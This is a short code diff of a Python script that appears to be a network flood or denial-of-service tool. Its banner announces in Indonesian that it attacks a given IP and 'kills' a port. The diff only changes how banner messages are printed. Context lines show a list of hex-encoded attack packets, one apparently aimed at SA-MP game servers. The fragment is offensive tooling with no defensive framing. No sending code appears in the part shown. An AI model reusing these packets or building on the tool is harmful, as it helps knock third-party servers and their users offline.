@@ -15,7 +15,7 @@ def print_slow(str):
         time.sleep(0.1)
 
 
-print colored("Sabar.....", ('red'))
+print_slow("Sabar...")
 time.sleep(5)
 os.system('clear')
 
@@ -37,9 +37,9 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("081e7eda","hex_codec")#cookie port 1111 tambem
                        ]
 
-print_slow colored("##########################################", ('red'))
-print_slow colored("OrionX Menyerang ip: %s Dan Membunuh Port: %s"%(orgip,port), ('red'))
-print_slow colored("##########################################", ('red'))
+print colored("##########################################", ('red'))
+print colored("OrionX Menyerang ip: %s Dan Membunuh Port: %s"%(orgip,port), ('red'))
+print colored("##########################################", ('red'))
 
             
 
